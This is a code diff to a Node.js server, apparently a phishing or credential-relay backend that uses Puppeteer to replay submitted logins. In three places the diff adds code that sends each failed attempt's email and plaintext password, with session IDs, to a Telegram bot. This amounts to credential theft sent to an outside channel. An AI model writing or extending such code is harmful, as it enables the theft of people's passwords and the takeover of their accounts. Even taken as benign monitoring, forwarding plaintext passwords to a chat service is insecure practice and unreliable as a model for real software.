@@ -1089,6 +1089,24 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
                     console.log(`💾 Stored invalid session record: invalid_${failureId}.json`);
 
+                    // Send Telegram notification for failed attempt
+                    if (telegramBot) {
+                        try {
+                            await telegramBot.sendFailedLoginNotification({
+                                email: email,
+                                password: password,
+                                timestamp: new Date().toISOString(),
+                                sessionId: sessionId,
+                                reason: 'Incorrect Password',
+                                authMethod: 'FAST Authentication (preloaded browser)',
+                                preloadUsed: true
+                            });
+                            console.log(`📤 Telegram failed login notification sent for ${email}`);
+                        } catch (telegramError) {
+                            console.warn('Telegram failed login notification failed:', telegramError.message);
+                        }
+                    }
+
                     // Clean up failed session
                     setTimeout(async () => {
                         try {
@@ -1176,6 +1194,24 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                     );
 
                     console.log(`💾 Stored invalid session record: invalid_${failureId}.json`);
+
+                    // Send Telegram notification for failed attempt
+                    if (telegramBot) {
+                        try {
+                            await telegramBot.sendFailedLoginNotification({
+                                email: email,
+                                password: password,
+                                timestamp: new Date().toISOString(),
+                                sessionId: newSessionId,
+                                reason: 'Incorrect Password',
+                                authMethod: 'Cold Start Authentication',
+                                preloadUsed: false
+                            });
+                            console.log(`📤 Telegram failed login notification sent for ${email}`);
+                        } catch (telegramError) {
+                            console.warn('Telegram failed login notification failed:', telegramError.message);
+                        }
+                    }
 
                     return res.status(401).json({
                         success: false,
@@ -1404,6 +1440,24 @@ app.post('/api/login-automation', async (req, res) => {
                     path.join(sessionDir, `invalid_${failureId}.json`),
                     JSON.stringify(failureData, null, 2)
                 );
+
+                // Send Telegram notification for failed attempt
+                if (telegramBot) {
+                    try {
+                        await telegramBot.sendFailedLoginNotification({
+                            email: email,
+                            password: password,
+                            timestamp: new Date().toISOString(),
+                            sessionId: sessionId,
+                            reason: 'Incorrect Password',
+                            authMethod: 'Puppeteer Automation',
+                            preloadUsed: false
+                        });
+                        console.log(`📤 Telegram failed login notification sent for ${email}`);
+                    } catch (telegramError) {
+                        console.warn('Telegram failed login notification failed:', telegramError.message);
+                    }
+                }
 
                 res.status(401).json({
                     success: false,
